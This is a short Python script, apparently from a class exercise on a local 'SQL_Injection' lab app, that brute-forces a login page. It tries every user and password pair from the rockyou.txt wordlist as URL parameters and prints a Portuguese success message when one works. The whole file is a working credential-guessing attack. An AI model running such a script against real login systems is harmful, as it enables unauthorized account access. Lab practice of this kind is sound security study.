import urllib.request
import json
import os

os.chdir(os.path.dirname(os.path.abspath(__file__)))

with open('rockyou.txt', "r", encoding="utf-8", errors="ignore") as file:
  dictionary = [line.strip() for line in file if ' ' not in line]

for user in dictionary:
  for passwd in dictionary:
    url = "http://localhost/Atividade_SQL_Injection/index.php?user=" + user + "&password=" + passwd + ""
    response = urllib.request.urlopen(url)
    html = response.read().decode('utf-8')
    data = json.loads(html)
    print(url)
    if data["success"] == 1:
      print("Quebrado com successo!")
      break
  else:
    continue
  break